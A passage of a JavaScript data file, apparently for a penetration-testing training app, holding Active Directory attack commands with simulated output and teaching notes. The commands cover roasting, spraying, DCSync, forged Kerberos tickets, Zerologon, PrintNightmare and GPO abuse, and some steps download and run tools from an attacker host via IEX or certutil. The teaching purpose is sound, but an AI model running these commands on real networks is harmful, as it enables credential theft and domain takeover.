      teach: 'Framework apps keep secrets in a .env file that should never be web-reachable. When it is, it leaks database and API credentials outright. Always probe for .env, .git/HEAD, and server-status before anything else.',
    },

    // ============================ ACTIVE DIRECTORY ============================
    'ad-dc-identify': {
      cmd: "nxc ldap 10.10.10.10 -u '' -p ''", tool: 'nxc',
      output: [
        'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
        'LDAP  10.10.10.10  389  DC01  [+] Anonymous bind to LDAP succeeded',
        'LDAP  10.10.10.10  389  DC01  [*] Base DN: DC=acme,DC=internal',
      ].join('\n'),
      signal: 'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
      teach: 'nxc against LDAP names the host (DC01) and the domain (acme.internal) and gives the base DN, the three facts every later AD command needs. Kerberos (88) + LDAP (389) + SMB (445) on one host is the fingerprint of a Domain Controller.',
    },
    'ad-anon-ldap-enum': {
      cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Enumerated domain users',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  tgibson',
        'LDAP  10.10.10.10  389  DC01  jbloggs',
        'LDAP  10.10.10.10  389  DC01  svc_sql',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  tgibson',
      teach: 'If anonymous LDAP bind is allowed, you can list every domain user with no credentials at all. That user list is the raw material for AS-REP roasting and password spraying, the two no-creds ways into the domain.',
    },
    'ad-user-enum': {
      cmd: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', tool: 'kerbrute',
      output: [
        '2026/09/17 10:41:02 >  Using KDC(s): 10.10.10.10:88',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: jbloggs@acme.internal',
        '2026/09/17 10:41:05 >  Done! Tested 48 usernames (2 valid) in 2.8s',
      ].join('\n'),
      signal: '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
      teach: 'kerbrute asks the KDC (port 88) whether each username exists, valid names get a different Kerberos error than bad ones, and it never submits a password, so it does not lock accounts. A confirmed list feeds roasting and spraying.',
    },
    'asrep-roast': {
      cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      ].join('\n'),
      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks, no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
    },
    'crack-asrep': {
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'The AS-REP hash (mode 18200) is encrypted with the user\'s password, so it cracks offline at full GPU speed with no lockout. "Cracked" means you now hold tgibson\'s real password, a foothold credential in the domain.',
    },
    'gpp-passwords': {
      cmd: "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'", tool: 'smbclient',
      output: [
        '\\acme.internal\\Policies\\{31B2F340-...}\\MACHINE\\Preferences\\Groups\\Groups.xml',
        '  userName="svc_admin"',
        '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      ].join('\n'),
      signal: '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read Groups.xml and decrypt the cpassword with gpp-decrypt, a free set of working credentials.',
    },
    'smb-share-inventory': {
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SPIDER_PLUS  Finance\\Payroll\\Q4-2023-summary.xlsx (18 KB)',
        'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      ].join('\n'),
      signal: 'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      teach: 'With any valid credential, spider_plus walks every readable share and lists interesting files. Scripts, spreadsheets, and configs on file shares routinely contain the next credential, loot the shares before you do anything loud.',
    },
    'kerberoast': {
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      ].join('\n'),
      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
    },
    'crack-tgs': {
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline, the DC never sees your guesses, so there is no lockout. "Cracked" means you now hold svc_sql\'s cleartext password, often a path to a database or a privileged service.',
    },
    'password-spray': {
      cmd: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [-] acme.internal\\Administrator:Autumn2026! STATUS_LOGON_FAILURE',
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      teach: 'Spraying tries ONE password across many users (never many passwords at one user, that locks accounts). One seasonal guess often lands a valid login, as it did for jbloggs. Always check the lockout policy (--pass-pol) first.',
    },
    'bloodhound-collect': {
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Collected 142 users, 38 groups, 12 computers',
        'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      teach: 'BloodHound collection pulls the whole directory (users, groups, ACLs, sessions) into a zip you import into the BloodHound UI. There you ask "shortest path to Domain Admins" and it draws the attack chain for you. Collect first, analyse second.',
    },
    'adcs-esc': {
      cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable", tool: 'certipy',
      output: [
        'Certificate Templates',
        '  Template Name            : UserEnroll',
        '  Enrollment Rights        : ACME\\Domain Users',
        '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      ].join('\n'),
      signal: '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone, including a Domain Admin. certipy finds it; the Vulnerabilities line is your path. AD CS is a frequent, high-impact domain-takeover route.',
    },
    'cert-authenticate': {
      cmd: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', tool: 'certipy',
      output: [
        '[*] Using principal: administrator@acme.internal',
        '[*] Trying to get TGT...',
        '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      ].join('\n'),
      signal: '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash, the certificate was just the key that unlocked the credential.',
    },
    'lateral-exec': {
      cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", tool: 'nxc',
      output: [
        'SMB  10.10.10.20  445  WEB01  [*] Windows Server 2019 (name:WEB01) (domain:acme.internal)',
        'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      ].join('\n'),
      signal: 'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      teach: '"Pwn3d!" marks every host where a credential is local admin. Spraying a working cred across the subnet maps your lateral movement, each Pwn3d! box is a new shell (via nxc -x, psexec, or evil-winrm) and new loot.',
    },
    'ad-path-manual': {
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Accounts with adminCount=1 (protected / privileged)',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      teach: 'When you cannot run BloodHound, you can still find privileged targets by hand, adminCount=1 flags protected accounts. svc_backup in Backup Operators can read the SAM/NTDS, a direct privilege path worth chasing.',
    },
    'dump-secrets': {
      cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --sam", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
        'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'svc-backup:1104:aad3b435b51404ee...:7c6a180b36896a0a8c02787eeafb0e4c:::',
      ].join('\n'),
      signal: 'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      teach: 'With local admin you can dump the SAM, the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
    },
    'dcsync': {
      cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc", tool: 'impacket-secretsdump',
      output: [
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        'acme.internal\\Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      ].join('\n'),
      signal: 'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      teach: 'DCSync asks the DC to replicate password data, it needs replication rights (Domain Admin, or a delegated edge). It returns every hash in the domain, including krbtgt (the key to forge golden tickets). This is total domain compromise.',
    },
    'own-domain-pth': {
      cmd: 'nxc smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator:31d6... (Pwn3d!)',
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  nt authority\\system',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  nt authority\\system',
      teach: 'You never need to crack the Administrator hash, you pass it. nxc -H authenticates with the NT hash directly and runs a command; "nt authority\\system" confirms you own the box. This is the payoff of dumping or DCSyncing the hash.',
    },
    'shadow-credentials': {
      cmd: 'pywhisker.py -d acme.internal -u jbloggs -p Autumn2026! --target svc_app --action add', tool: 'pywhisker',
      output: [
        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
        '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      ].join('\n'),
      signal: '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT (certipy auth) to recover its NT hash. A quiet alternative to resetting a password.',
    },
    'golden-ticket': {
      cmd: 'impacket-ticketer -nthash 1a59bd44... -domain-sid S-1-5-21-... -domain acme.internal administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for acme.internal/administrator',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice, the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
    },
    'trust-enum': {
      cmd: 'nltest /domain_trusts', tool: 'nltest',
      output: [
        'List of domain trusts:',
        '  0: ACME acme.internal (NT 5) (Forest Tree Root) (Primary Domain)',
        '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
        'The command completed successfully',
      ].join('\n'),
      signal: '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
      teach: 'Domains rarely stand alone. A trust to dev.acme.internal means credentials or tickets from one domain may reach the other, the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
    },
    'zerologon-check': {
      cmd: 'zerologon-scan DC01 10.10.10.10', tool: 'zerologon-scan',
      output: [
        'Performing authentication attempts...',
        '==============================',
        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      ].join('\n'),
      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT, it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
    },
    'wsus-abuse': {
      cmd: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer', tool: 'reg',
      output: [
        '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
        '# served over HTTP, not HTTPS',
      ].join('\n'),
      signal: '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients, running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
    },
    'sccm-enum': {
      cmd: "sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10", tool: 'sccmhunter',
      output: [
        '[+] Management Point found: MP01.acme.internal',
        '[+] Network Access Account retrievable from policy',
        'ACME\\svc_naa : NAA-P@ssw0rd',
      ].join('\n'),
      signal: 'ACME\\svc_naa : NAA-P@ssw0rd',
      teach: 'SCCM/MECM stores Network Access Account credentials that clients can retrieve, frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
    },
    'nxc-arsenal': {
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SMB  10.10.10.10  445  DC01  [*] Minimum password length: 7',
        'SMB  10.10.10.10  445  DC01  Share       Permissions',
        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, and the password policy in a single run, then can execute modules. A WRITE share is a place to drop a payload or capture a hash.',
    },
    'kerberos-tickets': {
      cmd: 'sudo ntpdate -u 10.10.10.10', tool: 'ntpdate',
      output: [
        '# before: nxc ldap ... -> KRB_AP_ERR_SKEW (clock skew too great)',
        '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      ].join('\n'),
      signal: '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes, "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC with ntpdate and retry.',
    },
    'bloodyad-acl': {
      cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup NewP@ss123!", tool: 'bloodyAD',
      output: [
        '[+] Password changed successfully for svc_backup',
      ].join('\n'),
      signal: '[+] Password changed successfully for svc_backup',
      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password", a concrete takeover. Each edge BloodHound draws is an action like this one.',
    },
    'gmsa-read': {
      cmd: "bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_app$' --attr msDS-ManagedPassword", tool: 'bloodyAD',
      output: [
        'distinguishedName: CN=svc_app,CN=Managed Service Accounts,DC=acme,DC=internal',
        'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      ].join('\n'),
      signal: 'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly (no cracking) and can pass it. gMSAs are often over-privileged service identities.',
    },
    'laps-read': {
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] LAPS passwords readable by jbloggs',
        'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      ].join('\n'),
      signal: 'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      teach: 'LAPS randomises the local Administrator password per machine, good security, unless your account can read the ms-Mcs-AdmPwd attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
    },
    'ticket-reuse': {
      cmd: 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal', tool: 'impacket-psexec',
      output: [
        '[*] Requesting shares on dc01.acme.internal.....',
        '[*] Found writable share ADMIN$',
        '[!] Launching semi-interactive shell',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME, no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
    },
    'powerview-enum': {
      signal: 'ActiveDirectoryRights  : GenericAll',
      teach: 'PowerView is a PowerShell script, not a built-in, so you load it into memory straight from your box with IEX (nothing touches disk), then call its functions. A GenericAll ACL over a group is a takeover edge (you can add yourself to it). Same data BloodHound uses, gathered by hand.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding PowerView.ps1', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'powershell', cmd: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1'); Find-InterestingDomainAcl -ResolveGUIDs", output: [
          'IdentityReferenceName  : jbloggs',
          'ActiveDirectoryRights  : GenericAll',
          'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
        ].join('\n') },
      ],
    },
    'ad-legacy-enum': {
      cmd: 'net group "Domain Admins" /domain', tool: 'net',
      output: [
        'Group name     Domain Admins',
        'Members',
        '-------------------------------------------------------------------------------',
        'Administrator            backupadmin',
      ].join('\n'),
      signal: 'Administrator            backupadmin',
      teach: 'Every Windows box ships with net and nltest. They are noisy but always present, when you land with no tools, these built-ins still list users, groups, and Domain Admins. backupadmin in Domain Admins is a target worth pursuing.',
    },
    'ad-psdotnet-enum': {
      cmd: 'powershell -ep bypass -c "([ADSISearcher]\'(servicePrincipalName=*)\').FindAll()"', tool: 'powershell',
      output: [
        'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
        'Properties: samaccountname={svc_sql} serviceprincipalname={MSSQLSvc/db01}',
      ].join('\n'),
      signal: 'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell, no upload. An account with an SPN (svc_sql) is kerberoastable. Living off the land this way sidesteps AV that flags known tooling.',
    },
    'ad-acl-abuse': {
      cmd: 'net group "Helpdesk Admins" jbloggs /add /domain', tool: 'net',
      output: [
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'When you hold GenericAll (or AddMember) over a group, you simply add yourself to it, the ACL edge becomes membership, and membership becomes its privileges. Walk the BloodHound path one edge at a time until it reaches Domain Admin or DCSync.',
    },
    'zerologon-exploit': {
      cmd: 'python3 set_empty_pw.py DC01 10.10.10.10', tool: 'sh',
      output: [
        '[*] Resetting DC01$ machine account password to empty',
        '[+] Success! You can now DCSync with -no-pass',
        '[!] Remember to restore the original password afterward',
      ].join('\n'),
      signal: '[+] Success! You can now DCSync with -no-pass',
      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
    },
    'coerce-auth': {
      cmd: "coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal", tool: 'coercer',
      output: [
        '[+] (PetitPotam) EfsRpcOpenFileRaw triggered',
        '[+] Target 10.10.10.10 authenticated to 10.10.14.5',
        '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      ].join('\n'),
      signal: '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      teach: 'Coercion tricks a target (often a DC) into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
    },
    'unconstrained-delegation': {
      signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Rubeus is an .exe, so stage it first (serve from your box, pull it over with certutil), then run its monitor. Pair it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe monitor /interval:5 /filteruser:DC01$ /nowrap', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Monitoring every 5 seconds for new TGTs',
          '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
          '[*] Base64EncodedTicket: doIF...',
        ].join('\n') },
      ],
    },
    'silver-ticket': {
      cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for CIFS/file01.acme.internal',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'A silver ticket forges a service ticket using one service account\'s hash, scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
    },
    'diamond-ticket': {
      signal: '[+] Saving diamond ticket to administrator.ccache',
      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. It is a Rubeus .exe, so stage it first (serve from your box, certutil it onto the target), then run the diamond command. Both ticket types need the krbtgt key, this is a stealthier flavour of the same post-DA persistence.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Requesting a legitimate TGT for jbloggs',
          '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
          '[+] Saving diamond ticket to administrator.ccache',
        ].join('\n') },
      ],
    },
    'gpo-abuse': {
      cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
      output: [
        '[+] Version updated for GPO {31B2F340-...}',
        '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      ].join('\n'),
      signal: '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      teach: 'Write access to a Group Policy Object lets you push a scheduled task to every computer the GPO is linked to, code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
    },
    'dnsadmins-abuse': {
      cmd: 'nxc smb 10.10.10.10 -u svc_dns -p P@ss -x "reg add ...\\DNS\\Parameters /v ServerLevelPluginDll /d \\\\10.10.14.5\\share\\dns.dll"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
        '# after: sc.exe stop dns & sc.exe start dns -> DLL runs as SYSTEM',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
      teach: 'The DnsAdmins group can tell the DNS service (often on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy, but membership in DnsAdmins is a direct line to owning the DC.',
    },
    'sid-history-abuse': {
      cmd: 'impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain acme.internal -extra-sid S-1-5-21-ROOT-519 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating golden ticket with extra SID (Enterprise Admins)',
        '[+] Saving ticket in administrator.ccache',
        '[*] Cross-domain access via SID History granted',
      ].join('\n'),
      signal: '[*] Cross-domain access via SID History granted',
      teach: 'SID History lets a principal carry privileged SIDs from another domain, legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
    },
    'eternalblue': {
      cmd: 'nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Host script results:',
        '| smb-vuln-ms17-010:',
        '|   VULNERABLE: Remote Code Execution in SMBv1 (ms17-010)',
        '|_    State: VULNERABLE',
      ].join('\n'),
      signal: '|_    State: VULNERABLE',
      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot, but confirm the target is a real lab host, not a honeypot, before you fire the exploit.',
    },
    'nopac': {
      cmd: "noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump", tool: 'noPac.py',
      output: [
        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
        '[+] Got a TGT impersonating a Domain Admin',
        '[*] Dumping NTDS...',
        'krbtgt:502:aad3b...:1a59bd44...:::',
      ].join('\n'),
      signal: '[+] Got a TGT impersonating a Domain Admin',
      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user, a near-instant domain takeover on unpatched DCs. Beyond core OSCP scope but common in labs; confirm the DC is unpatched first.',
    },
    'printnightmare': {
      cmd: "CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 '\\\\10.10.14.5\\share\\evil.dll'", tool: 'CVE-2021-1675.py',
      output: [
        '[*] Connecting to the Print Spooler service (MS-RPRN)',
        '[*] Triggering AddPrinterDriverEx to load the remote driver',
        '[+] Driver loaded; payload executed as SYSTEM',
      ].join('\n'),
      signal: '[+] Driver loaded; payload executed as SYSTEM',
      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to load a driver as SYSTEM, local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
    },
    'ms14-068': {
      cmd: "impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal", tool: 'impacket-goldenPac',
      output: [
        '[*] Requesting a TGT with a forged PAC (admin SID)',
        '[+] Authenticated as Domain Admin',
        'C:\\Windows\\system32>',
      ].join('\n'),
      signal: '[+] Authenticated as Domain Admin',
      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin membership. It only works on DCs missing the 2014 patch, rare today, but a clean, memorable example of how PAC validation can fail.',
    },
    'delegation-abuse': {
      cmd: 'impacket-addcomputer acme.internal/jbloggs:Autumn2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!', tool: 'impacket-addcomputer',
      output: [
        '[*] Successfully added machine account OBOL$ with password MachinePass123!',
        '[*] MachineAccountQuota (default 10) allowed the creation',
      ].join('\n'),
      signal: '[*] Successfully added machine account OBOL$ with password MachinePass123!',
      teach: 'By default any domain user can add up to 10 computer accounts (MachineAccountQuota). A machine account you control is the starting piece for RBCD and S4U delegation attacks, create it, then configure delegation to impersonate an admin.',
    },
    'getst-impersonation': {
      cmd: "impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'", tool: 'impacket-getST',
      output: [
        '[*] Impersonating administrator',
        '[*] Requesting S4U2self',
        '[*] Requesting S4U2proxy',
